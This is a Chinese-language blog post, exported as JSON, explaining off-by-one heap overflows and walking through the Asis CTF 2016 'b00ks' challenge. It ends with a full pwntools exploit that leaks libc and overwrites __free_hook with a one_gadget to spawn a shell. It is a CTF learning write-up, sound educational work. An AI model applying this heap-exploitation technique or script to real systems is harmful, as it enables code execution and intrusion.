{"title":"off-by-one","uid":"bd9db8b2380b14fbad4621ba09b4c803","slug":"off-by-one","date":"2021-12-03T13:24:02.000Z","updated":"2021-12-26T12:50:48.560Z","comments":true,"path":"api/articles/off-by-one.json","keywords":null,"cover":"https://s2.loli.net/2021/12/26/8dARZTCroeUzIg5.jpg","content":"<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。这个字节可能是任意可控的或者是NULL字节。以下是对两种情况的利用方法</p>\n<ol>\n<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>\n<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>\n</ol>\n<h1 id=\"Asis-CTF-2016-b00ks\"><a href=\"#Asis-CTF-2016-b00ks\" class=\"headerlink\" title=\"Asis CTF 2016 b00ks\"></a>Asis CTF 2016 b00ks</h1><p>这道题是一道典型的溢出 NULL 字节。</p>\n<h2 id=\"题目分析\"><a href=\"#题目分析\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h2><p>题目是一个图书管理系统。</p>\n<p><img src=\"https://i.loli.net/2021/12/03/q5gUAjznoZv1B9F.png\" alt=\"image.png\"></p>\n<p>进入name autor里面的读取函数会发现存在off by one漏洞</p>\n<p><img src=\"https://i.loli.net/2021/12/01/vUVYnTtm4o6iL27.png\" alt=\"image.png\"></p>\n<p>之后进入create函数（这里我对变量名重命名了），通过分析我们可以知道图书管理系统的大致结构</p>\n<p><img src=\"https://i.loli.net/2021/12/01/FmSuyrJD3A75bOK.png\" alt=\"image.png\"></p>\n<p>在一段bss段中专门有记录book_contain_ptr的地方以及指向这个地方的指针，程序通过这个指针加上ID作为偏移去寻找对应的book_contain_ptr，从而找到book的信息</p>\n<p><img src=\"https://s2.loli.net/2021/12/05/OzJ7D8WFYIvoqkH.png\" alt=\"image.png\"></p>\n<p>分析完以后，我们可以思考如何利用off-by-one漏洞，我们可以用它泄露book的地址，有了这个地址我们可以将其修改为伪造的book，通过这个伪造的book就可以对其他book进行修改操作，比如修改其他book里面的contain从而它修改malloc_hook或者free_hook地址为one_gadget最后拿到shell。</p>\n<p>第一步，创建book1并利用off-by-one获取地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>, <span class=\"number\">0x90</span>, <span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">book1_contain_ptr = u64(p.recvuntil(<span class=\"string\">&#x27;\\x0a&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>第二步，创建一个足够大的book2，并计算出地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x21000</span>, <span class=\"string\">&#x27;cccc&#x27;</span>, <span class=\"number\">0x21000</span>, <span class=\"string\">&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">book2_contain_ptr = book1_contain_ptr + <span class=\"number\">0x30</span></span><br><span class=\"line\">success(<span class=\"string\">&#x27;book1_contain_ptr -&gt; &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(book1_contain_ptr)))</span><br></pre></td></tr></table></figure>\n\n<p>第三步，伪造book1_contain_ptr，指向book2_name，并获取地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x40</span> + p64(<span class=\"number\">1</span>) + p64(book2_contain_ptr + <span class=\"number\">8</span>) * <span class=\"number\">2</span> + p64(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>, payload)</span><br><span class=\"line\">change_name(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Name: &#x27;</span>)</span><br><span class=\"line\">book2_name_ptr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>**这里填充’a’ * 40是因为之前修改了book1_contain_ptr的最后一字节为0，指针从原本0x564403ab0160变为0x564403ab0100，所以只要我们填充到0x564403ab0100，就可以对book1_contain进行伪造。<img src=\"https://s2.loli.net/2021/12/05/gKSLz3w7Mp8Um2B.png\" alt=\"image.png\"></p>\n<p>第四步，计算libcbase，free_hook，system地址</p>\n<p><img src=\"https://s2.loli.net/2021/12/05/YG5qOIkE6z3awPh.png\" alt=\"image.png\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc_base = book2_name_ptr - <span class=\"number\">0x5b0010</span></span><br><span class=\"line\">success(<span class=\"string\">&#x27;book2_name_ptr -&gt; &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(book2_name_ptr)))</span><br><span class=\"line\">free_hook = libc_base + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4527a</span> <span class=\"comment\">#0x45226 0x4527a 0xf03a4 0xf1247</span></span><br><span class=\"line\">system = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">bin_sh = libc_base + libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br></pre></td></tr></table></figure>\n\n<p>第五步，利用伪造的book1修改book2指向free_hook，在控制book2修改free_hook</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edit(<span class=\"number\">1</span>, p64(free_hook) + p64(free_hook))</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(one_gadget))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">binary = <span class=\"string\">&#x27;./b00ks&#x27;</span></span><br><span class=\"line\">elf = ELF(binary)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">local = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">\tp = process(binary)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tp = remote(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">name_size, name, description_size, description</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, <span class=\"built_in\">str</span>(name_size))</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, name)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, <span class=\"built_in\">str</span>(description_size))</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, description)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">index</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">index, description</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, description)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change_name</span>(<span class=\"params\">name</span>):</span></span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">\tp.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, name)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;: &#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>, <span class=\"number\">0x90</span>, <span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">book1_contain_ptr = u64(p.recvuntil(<span class=\"string\">&#x27;\\x0a&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x21000</span>, <span class=\"string\">&#x27;cccc&#x27;</span>, <span class=\"number\">0x21000</span>, <span class=\"string\">&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">book2_contain_ptr = book1_contain_ptr + <span class=\"number\">0x30</span></span><br><span class=\"line\">success(<span class=\"string\">&#x27;book1_contain_ptr -&gt; &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(book1_contain_ptr)))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x40</span> + p64(<span class=\"number\">1</span>) + p64(book2_contain_ptr + <span class=\"number\">8</span>) * <span class=\"number\">2</span> + p64(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">change_name(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Name: &#x27;</span>)</span><br><span class=\"line\">book2_name_ptr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc_base = book2_name_ptr - <span class=\"number\">0x5b0010</span></span><br><span class=\"line\">success(<span class=\"string\">&#x27;book2_name_ptr -&gt; &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(book2_name_ptr)))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">free_hook = libc_base + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4527a</span> <span class=\"comment\">#0x45226 0x4527a 0xf03a4 0xf1247</span></span><br><span class=\"line\">system = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">bin_sh = libc_base + libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">1</span>, p64(free_hook) + p64(free_hook))</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(one_gadget))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","feature":true,"text":"介绍off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。这个字节可能是任意可控的或者是NULL字节。以下是对两种情况的利用方法 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":3,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">介绍</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Asis-CTF-2016-b00ks\"><span class=\"toc-text\">Asis CTF 2016 b00ks</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90\"><span class=\"toc-text\">题目分析</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"堆","uid":"c4bf9a47934395d80559cc60b6290065","slug":"堆","date":"2021-11-23T14:10:20.000Z","updated":"2021-12-05T05:02:19.781Z","comments":true,"path":"api/articles/堆.json","keywords":null,"cover":"https://i.loli.net/2021/11/25/Z485hvdikxGYrAS.jpg","text":" 在栈上拖了好久才进入堆，这里就介绍一下这几天所学的内容 什么是堆 堆不同于栈，栈是静态分布，也就是程序加载进内存就会分配，而堆则是在程序执行时需要才会分配（由malloc、alloc、realloc函数分配内存后出现）。 堆其实就是程序虚拟地址空间的一块连续的线性区域，生长方向...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"pwn","slug":"pwn","count":3,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":3,"path":"api/tags/笔记.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}